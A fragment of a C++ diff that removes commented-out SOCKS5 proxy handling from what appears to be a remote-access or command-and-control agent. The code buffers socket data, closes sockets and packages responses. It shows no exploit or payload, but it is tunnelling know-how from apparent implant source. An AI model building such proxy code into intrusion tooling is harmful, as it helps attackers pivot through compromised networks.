-//                             TmpBuff = nullptr;
-//                             KhDbg("SOCKS5: Initial response set (%u bytes)", ResponseLen);
-//                         } else {
-//                             NewBuff = (BYTE*)hAlloc(TmpLen + ResponseLen);
-//                             if (!NewBuff) {
-//                                 KhDbg("SOCKS5: ERROR: Failed to allocate combined buffer");
-//                                 hFree(TmpBuff);
-//                                 break;
-//                             }
-
-//                             Mem::Copy( NewBuff, ResponseData, ResponseLen );
-//                             Mem::Copy( (char*)NewBuff + ResponseLen, TmpBuff, TmpLen );
-
-//                             hFree( ResponseData );
-//                             hFree( TmpBuff );
-
-//                             ResponseData = NewBuff;
-//                             ResponseLen += TmpLen;
-//                             NewBuff = nullptr;
-
-//                             KhDbg("SOCKS5: Appended data (total %u bytes)", ResponseLen);
-//                         }
-//                     }
-//                 }
-//             } while (TmpLen > 0);
-//             break;
-//         }
-
-//         case KH_SOCKET_CLOSE: {
-//             KhDbg("SOCKS5: Closing socket (ID=%u)", ServerID);
-//             SOCKET sockToClose = Self->Sckt->Get(ServerID);
-//             if (sockToClose == INVALID_SOCKET) {
-//                 KhDbg("SOCKS5: ERROR: Socket not found (ID=%u)", ServerID);
-//                 return ERROR_NOT_FOUND; 
-//             }
-//             Self->Ws2_32.closesocket(sockToClose);
-//             Self->Sckt->RmCtx(ServerID);
-//             KhDbg("SOCKS5: Socket closed");
-//             break;
-//         }
-//     }
-
-//     KhDbg("SOCKS5: Preparing response (IsExit=%d, ServerID=%u, ResponseLen=%u)", IsExit, ServerID, ResponseLen);
-//     Self->Pkg->Int32( Package, IsExit );
-//     Self->Pkg->Int32( Package, ServerID );
-    
-//     if ( ResponseData && ResponseLen ) {
-//         Self->Sckt->LogData("send data", ResponseData, ResponseLen );
-//         Self->Pkg->Bytes( Package, ResponseData, ResponseLen );
-//         hFree( ResponseData );
-//     }
-//     if ( Data ) hFree( Data );
-    
-//     KhDbg("SOCKS5: Operation completed (Result=0x%X)", Result);
-//     return Result;
-// }
 
 auto DECLFN Task::Config(
     _In_ JOBS* Job
